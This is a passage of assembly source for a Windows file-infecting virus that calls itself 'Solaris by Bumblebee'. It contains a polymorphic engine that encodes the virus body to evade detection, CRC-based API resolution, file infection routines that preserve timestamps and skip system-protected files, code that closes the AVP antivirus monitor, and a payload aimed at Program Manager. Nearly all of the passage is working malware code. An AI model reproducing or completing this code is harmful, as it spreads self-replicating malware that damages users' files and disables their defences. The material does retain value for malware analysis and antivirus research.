        call    CRC32
        xor     edx,edx
        mov     ecx,dword ptr [esp+28h]
        div     ecx
        mov     dword ptr [esp+20h],edx
        popad
        pop     eax
        retn    4

;
; VOID getDelta(VOID) (modifies ebp=delta offset)
;
getDelta:
        call    deltaOffset
        ; the virus identifier :)
virusId db      '[ Solaris by Bumblebee ]'
deltaOffset:
        pop     ebp
        sub     ebp,offset virusId
        ret
;
;  in: esi addr src
;      edi size of src
; out: eax crc32 of src
;
; (not save regs)
;
CRC32:
	cld
        xor     ecx,ecx
        dec     ecx
	mov     edx,ecx
	push    ebx
NextByteCRC:
	xor     eax,eax
	xor     ebx,ebx
	lodsb
	xor     al,cl
	mov     cl,ch
	mov     ch,dl
	mov     dl,dh
	mov     dh,8
NextBitCRC:
	shr     bx,1
	rcr     ax,1
	jnc     NoCRC
	xor     ax,08320h
	xor     bx,0EDB8h
NoCRC:
        dec     dh
	jnz     NextBitCRC
	xor     ecx,eax
	xor     edx,ebx
        dec     edi
	jnz     NextByteCRC
	pop     ebx
	not     edx
	not     ecx
        mov     eax,edx
	rol     eax,16
        mov     ax,cx
	ret

;
; [BSEE] or
; Bumblebee's Stack Encoding Engine or
; Bumblebee's Solaris Encoding Engine ;)
;
; quite simple it encodes the virus into a poly code that pushes
; the whole virus in the stack. the relocation stuff is not
; added here, so you can use the engine just adding a jmp esp
; after the encoded virus (but notice the pushad!).
;
; it makes different operations with data being stored in the
; stack before being pushed.
;
; it doesn't adds garbage. the encoded virus is long and poly
; enought to not need garbage (IMHO). as i'm not a good poly
; coder, that's a kewl engine if we think what i used to code hehe
;
; returns the encoded size. the esp value is decreased by vSize
; and virus size must be dword aligned. 1st byte it's a pushad.
;
; DWORD encodeVirus(DWORD dest_addr) (returns size and saves regs)
;
encodeVirus:
        push    eax
        pushad

        ; init register control
        xor     eax,eax
        lea     edi,RegStatus+ebp
        mov     ecx,8
        rep     stosb
        mov     byte ptr [RegStatus+ebp+_ESP],1

        mov     edi,dword ptr [esp+28h]         ; get dest addr        

        mov     eax,vSize
        mov     ecx,4
        xor     edx,edx
        div     ecx
        mov     ecx,eax                         ; dword's to encode
        xor     ebx,ebx                         ; to store size
        mov     esi,dword ptr [virusSample+ebp]
        add     esi,vSize*2
        sub     esi,4

        mov     al,60h                          ; 1st pushad
        stosb
        inc     ebx
encodeVirus0:
                                                ; random encoding
        mov     eax,5                           ; scheme for each dword
        push    eax
        call    rndInRange
        cmp     eax,1                           ; 40%
        je      encRndAddSubReg
        cmp     eax,2
        je      encRndAddSubReg
        cmp     eax,3                           ; 20%
        je      encRndPushReg
        cmp     eax,4                           ; 20%
        je      encRndCmpRegImm

        jmp     encPushImm32                    ; default 20%

;
; Polymorphic engine data
;
RegStatus       db      8 dup(0)                ; 1: used 0: free
WorkReg         db      0                       ; 0..7
RecursiveCoef   dd      0                       ; rec level in rec calls :P

;
;    push imm32
;
encPushImm32:
        mov     al,68h                          ; push xxxxxxxxh
        stosb                                   ; store
        std
        lodsd                                   ; get dword
        cld
        stosd                                   ; store dword
        add     ebx,5                           ; push + inm32 = 5 bytes
doLoop:
        loop    encodeVirus0

        mov     dword ptr [esp+20h],ebx         ; set return value
        popad
        pop     eax
        retn    4

encRndAddSubReg:
        push    ecx ebx                         ; save loop and size

        call    addAddSubRegImm

        pop     ebx ecx                         ; restore regs
        add     ebx,eax                         ; add encoded size

        jmp     doLoop
;
;   cmp reg,imm32
;   <jmp: jb jnb je jne jbe ja js> op0
;   jmp op1
;op0:
;   [poly code to encode n dwords]
;   jmp op2
;op1:
;   [poly code to encode n dwords]
;op2:
;
;   both options encode the same code but in different way
;   it supports recursive calls, so [poly code to encode n dwords]
;   can be generated also by this routine...
;
encRndCmpRegImm:
        mov     eax,RECLEVEL                    ; setup recursive coeff
        push    eax
        call    rndInRange
        inc     eax
        mov     byte ptr [RecursiveCoef+ebp],al

        push    ecx ebx                         ; save loop and size

        call    addRndCmpRegImm

        pop     ebx ecx                         ; restore regs
        jc      encRndAddSubReg

        add     ebx,eax                         ; add encoded size

        sub     ecx,edx                         ; dec loops
                                                ; that's needed coz we
                                                ; get edx dwords in one
                                                ; main loop
        jmp     doLoop

addRndCmpRegImm:
        dec     byte ptr [RecursiveCoef+ebp]

        xor     eax,eax
        mov     al,byte ptr [RecursiveCoef+ebp]
        or      al,al
        jz      recursiveOver
        cmp     ecx,eax                         ; check we have things
        jae     hasSpaceToEncode                ; to encode
recursiveOver:
        stc
        ret
hasSpaceToEncode:

        push    edi                             ; save prt addr

        mov     eax,0ffffffffh                  ; get a random dword value
        push    eax
        call    rndInRange
        push    eax

        call    GetReg                          ; get random reg

        pop     edx
        mov     cl,al
        push    eax
        call    AddCmpREGIMM

        pop     eax
        call    FreeReg                         ; free the register

        mov     eax,7                           ; get a random jmp
        push    eax
        call    rndInRange

        add     al,72h                          ; store the cnd jmp
        stosb

        mov     al,5
        stosb

        mov     al,0e9h                         ; setup jmp far
        stosb

        push    edi                             ; save ptr addr
        stosd                                   ; save space

        push    esi                             ; save source

        xor     ecx,ecx
        mov     cl,byte ptr [RecursiveCoef+ebp] ; get # dword to encode
        push    ecx                             ; save loops
        xor     ebx,ebx
encodeCmpLoop0:
        push    ecx ebx                         ; save loop and size

        mov     eax,2                           ; recursive?
        push    eax
        call    rndInRange
        or      al,al
        jz      nonRec0
        mov     al,byte ptr [RecursiveCoef+ebp]
        or      al,al
        jz      nonRec0
        push    dword ptr [RecursiveCoef+ebp]
        call    addRndCmpRegImm
        pop     dword ptr [RecursiveCoef+ebp]
        jnc     nonRec1
nonRec0:
        call    addAddSubRegImm
        pop     ebx ecx                         ; restore regs
        jmp     nonRec2
nonRec1:
        pop     ebx ecx                         ; restore regs
        sub     ecx,edx
nonRec2:
        add     ebx,eax                         ; add encoded size

        loop    encodeCmpLoop0

        pop     ecx                             ; get loops
        pop     esi                             ; restore source
        pop     edx                             ; get prt addr

        add     ebx,5
        mov     dword ptr [edx],ebx             ; fix op1 jmp

        mov     eax,5                           ; add DS: prefix?
        push    eax
        call    rndInRange
        cmp     al,3                            ; 30%
        jb      skipDSPrefix

        inc     byte ptr [edx]                  ; a byte before jmp!
        mov     al,3eh                          ; DS: (thanx griyo!)
        stosb                                   ; nice anti-h stuff
skipDSPrefix:

        mov     al,0e9h                         ; build jmp
        stosb

        push    edi                             ; save ptr addr
        stosd                                   ; save space

        ; we have ecx and esi ready
        push    ecx                             ; save loops again
        xor     ebx,ebx
encodeCmpLoop1:
        push    ecx ebx                         ; save loop and size

        mov     eax,2                           ; recursive?
        push    eax
        call    rndInRange
        or      al,al
        jz      nonRec3
        mov     al,byte ptr [RecursiveCoef+ebp]
        or      al,al
        jz      nonRec3
        push    dword ptr [RecursiveCoef+ebp]
        call    addRndCmpRegImm
        pop     dword ptr [RecursiveCoef+ebp]
        jnc     nonRec4
nonRec3:
        call    addAddSubRegImm
        pop     ebx ecx                         ; restore regs
        jmp     nonRec5
nonRec4:
        pop     ebx ecx                         ; restore regs
        sub     ecx,edx
nonRec5:
        add     ebx,eax                         ; add encoded size

        loop    encodeCmpLoop1

        pop     ecx                             ; get loops
        pop     edx                             ; get ptr addr

        mov     dword ptr [edx],ebx             ; fix op2 jmp

        pop     edx                             ; get old prt
        mov     eax,edi
        sub     eax,edx                         ; calc added size

        mov     edx,ecx                         ; move loops here
        dec     edx

        clc
        ret
;
;   mov reg,a
;   push reg
;
encRndPushReg:
        push    ecx ebx                         ; save loop and size

        push    edi                             ; save prt addr

        std
        lodsd                                   ; get dword
        cld
        push    eax                             ; save value

        call    GetReg                          ; get random reg
                                                ; get value
        pop     edx                             ; mov reg32,imm32
        mov     cl,al
        push    ecx
        call    AddMovREGIMM

        pop     ecx                             ; push reg32
        push    ecx
        call    AddPushREG

        pop     eax
        call    FreeReg                         ; free the register

        pop     edx                             ; get old prt
        mov     eax,edi
        sub     eax,edx                         ; calc added size

        pop     ebx ecx                         ; restore regs
        add     ebx,eax                         ; add encoded size

        jmp     doLoop

;
; add opcode:
;   mov reg,a-b || mov reg,a+b
;   add reg,b   || add reg,-b
;   push reg    || push reg
; sub opcode:
;   mov reg,a-b || mov reg,a+b
;   add reg,b   || add reg,-b
;   push reg    || push reg
;
;   ret eax enc size
;
addAddSubRegImm:
        call    GetReg                          ; get rnd reg
        mov     byte ptr [WorkReg+ebp],al

        mov     eax,2                           ; add or sub?
        push    eax
        call    rndInRange
        mov     bl,al

        mov     eax,2                           ; again, add or sub?
        push    eax
        call    rndInRange
        mov     bh,al

        mov     eax,0ffffffffh                  ; get a random dword value
        push    eax
        call    rndInRange

        push    edi                             ; save current dest
        push    eax                             ; save rnd value

        std
        lodsd                                   ; get dword
        cld

        mov     edx,eax
        pop     eax                             ; get rnd value
        or      bl,bl
        jz      doAdd0
        add     edx,eax                         ; add dword rnd value
        add     edx,eax
doAdd0:
        sub     edx,eax                         ; sub dword rnd value
        push    eax                             ; store rnd value
        mov     cl,byte ptr [WorkReg+ebp]
        call    AddMovREGIMM

        pop     edx                             ; get rnd value

        or      bh,bh                           ; add or sub opcode
        jz      doSub0

        or      bl,bl                           ; add: add or sub?
        jz      doAdd1
        not     edx
        inc     edx
doAdd1:
        mov     cl,byte ptr [WorkReg+ebp]
        call    AddAddREGIMM

        jmp     doSub2
doSub0:
        or      bl,bl                           ; sub: add or sub?
        jnz     doSub1
        not     edx
        inc     edx
doSub1:
        mov     cl,byte ptr [WorkReg+ebp]
        call    AddSubREGIMM
doSub2:

        mov     cl,byte ptr [WorkReg+ebp]
        call    AddPushREG

        mov     al,byte ptr [WorkReg+ebp]
        call    FreeReg

        pop     edx                             ; get old dest
        mov     eax,edi
        sub     eax,edx                         ; calc bytes stored
        ret

_EAX    equ     0
_ECX    equ     1
_EDX    equ     2
_EBX    equ     3
_ESP    equ     4
_EBP    equ     5
_ESI    equ     6
_EDI    equ     7

;
; returns AL: selected register
;
GetReg:
        mov     eax,8
        push    eax
        call    rndInRange

        lea     ecx,RegStatus+ebp
        add     ecx,eax
        mov     dl,byte ptr [ecx]
        or      dl,dl
        jnz     GetReg

        mov     byte ptr [ecx],1
        ret

;
;  AL: selected register to free
;
FreeReg:
        and     eax,7
        lea     ecx,RegStatus+ebp
        add     ecx,eax
        mov     byte ptr [ecx],0
        ret

;
;  Instruction generators
;
;  EDI: Destination code
;  ECX: Reg (if aplicable)
;  EDX: Inm (if aplicable)
;

AddCmpREGIMM:
        or      cl,cl
        jnz     AddCmpREGIMM0
        mov     al,3dh
        stosb
        jmp     AddCmpREGIMM1
AddCmpREGIMM0:
        mov     al,081h
        stosb
        mov     al,0f8h
        add     al,cl
        stosb
AddCmpREGIMM1:
        mov     eax,edx
        stosd
        ret

AddMovREGIMM:
        mov     al,0b8h
        add     al,cl
        stosb
        mov     eax,edx
        stosd
        ret

AddAddREGIMM:
        or      cl,cl
        jnz     AddAddREGIMM0
        mov     al,05h
        stosb
        jmp     AddAddREGIMM1
AddAddREGIMM0:
        mov     al,081h
        stosb
        mov     al,0c0h
        add     al,cl
        stosb
AddAddREGIMM1:
        mov     eax,edx
        stosd
        ret

AddSubREGIMM:
        or      cl,cl
        jnz     AddSubREGIMM0
        mov     al,2dh
        stosb
        jmp     AddSubREGIMM1
AddSubREGIMM0:
        mov     al,081h
        stosb
        mov     al,0e8h
        add     al,cl
        stosb
AddSubREGIMM1:
        mov     eax,edx
        stosd
        ret

AddPushREG:
        mov     al,050h
        add     al,cl
        stosb
        ret

AddPopREG:
        mov     al,058h
        add     al,cl
        stosb
        ret
        
; api search data ----------------------------------------------------------
address         dd      0
names           dd      0 
ordinals        dd      0
nexports        dd      0
expcount        dd      0

FSTAPI                  label   byte
CrcCloseHandle          dd      068624a9dh
                        db      12
_CloseHandle            dd      0

CrcCreateFileA          dd      08c892ddfh
                        db      12
_CreateFileA            dd      0

CrcCreatFileMappingA    dd      096b2d96ch
                        db      19
_CreateFileMappingA     dd      0

CrcFreeLibrary          dd      0afdf191fh
                        db      12
_FreeLibrary            dd      0

CrcGetProcAddress       dd      0ffc97c1fh
                        db      15
_GetProcAddress         dd      0

CrcGetFileTime          dd      04434e8feh
                        db      12
_GetFileTime            dd      0

CrcGetFileAttributesA   dd      0c633d3deh
                        db      19
_GetFileAttributesA     dd      0

CrcGetFileSize          dd      0ef7d811bh
                        db      12
_GetFileSize            dd      0

CrcFindFirstFileA       dd      0ae17ebefh
                        db      15
_FindFirstFileA         dd      0

CrcFindNextFileA        dd      0aa700106h
                        db      14
_FindNextFileA          dd      0

CrcFindClose            dd      0c200be21h
                        db      10
_FindClose              dd      0

CrcGetCurrentDirectoryA dd      0ebc6c18bh
                        db      21
_GetCurrentDirectoryA   dd      0

CrcGetSystemDirectoryA  dd      0593ae7ceh
                        db      20
_GetSystemDirectoryA    dd      0

CrcGetSystemTime        dd      075b7ebe8h
                        db      14
_GetSystemTime          dd      0

CrcGetWindowsDirectoryA dd      0fe248274h
                        db      21 
_GetWindowsDirectoryA   dd      0

CrcGetLastError         dd      087d52c94h
                        db      13
_GetLastError           dd      0

CrcGetTickCount         dd      0613fd7bah
                        db      13
_GetTickCount           dd      0

CrcLoadLibraryA         dd      04134d1adh
                        db      13
_LoadLibraryA           dd      0

CrcMapViewOfFile        dd      0797b49ech
                        db      14
_MapViewOfFile          dd      0

CrcSetCurrentDirectoryA dd      0b2dbd7dch
                        db      21 
_SetCurrentDirectoryA   dd      0

CrcSetFileTime          dd      04b2a3e7dh
                        db      12
_SetFileTime            dd      0

CrcSetFileAttributesA   dd      03c19e536h
                        db      19
_SetFileAttributesA     dd      0

CrcUnmapViewOfFile      dd      094524b42h
                        db      16
_UnmapViewOfFile        dd      0

CrcVirtualAlloc         dd      04402890eh
                        db      13
_VirtualAlloc           dd      0

ENDAPI                  label   byte

; non kernel32 apis --------------------------------------------------------
imagehlpdllStr          db      'IMAGEHLP.DLL',0
imagehlpdllHnd          dd      0
CheckSumMappedFileStr   db      'CheckSumMappedFile',0
_CheckSumMappedFile     dd      0
sfcdllStr               db      'SFC.DLL',0
sfcdllHnd               dd      0
SfcIsFileProtectedStr   db      'SfcIsFileProtected',0
_SfcIsFileProtected     dd      0
user32dllStr            db      'USER32.DLL',0
user32dllHnd            dd      0
FindWindowAStr          db      'FindWindowA',0
_FindWindowA            dd      0
PostMessageAStr         db      'PostMessageA',0
_PostMessageA           dd      0

; misc data ----------------------------------------------------------------
; i use the same code of the payload to close avp monitor
avStr                   db      'AVP Monitor',0
; hu hu, just end 1 app hehehe
payloadStr              db      'Program Manager',0

; infection data -----------------------------------------------------------
path0                   dd      0
path1                   dd      0
fileMappingObj          db      '1234567890',0
virusSample             dd      0
fileTime0               dd      0,0
fileTime1               dd      0,0
fileTime2               dd      0,0
fileAttrib              dd      0
fileSize                dd      0
ofileSize               dd      0
ochksum                 dd      0
nchksum                 dd      0
padding                 dd      0
genSize                 dd      0
fHnd                    dd      0
fhmap                   dd      0
mapMem                  dd      0
find_data               WIN32_FIND_DATA <0>
findHnd                 dd      0
fndMask                 db      '*.*',0
tmpExt                  dd      0
infCount                db      0

; very important this aligment for virus encoding
align   4h

vEnd    label   byte

;
; Fake host needed for 1st gen
;
fakeHost:
        push    1000h
        call    title
        db      'virus activated',0
title:  call    mess
        db      'Kelvin, welcome to Solaris.',0
mess:   
        push    0h
        call    MessageBoxA

        push    0h
        call    ExitProcess

;
; This is another way to setup the 1st generation virus sample.
;
setupVirus:
        lea     esi,restoreCode                 ; restore original code
        lea     edi,vBegin
        mov     ecx,restoreSize
        rep     movsb

        mov     dword ptr [encKey],0            ; 1st loop key=0

        pushad                                  ; setup stack
        sub     esp,vSize
        ; we must push 2 times the same offset, no mather wich one
        push    offset reloc1stGen              ; setup reloc stuff
        push    offset reloc1stGen              ; setup reloc stuff
        ; emul jmp esp
        add     esp,8
        jmp     inicio

reloc1stGen:
        ; original code replazed by the jmp to setupVirus to be
        ; restored at its original plaze
restoreCode:
        sub     esp,8
        mov     esi,dword ptr [esp+vSize+28h]
restoreSize equ $-restoreCode
Ends
End     inicio
;
; ah... who's Kelvin? fuck!
; just read the book :]
;

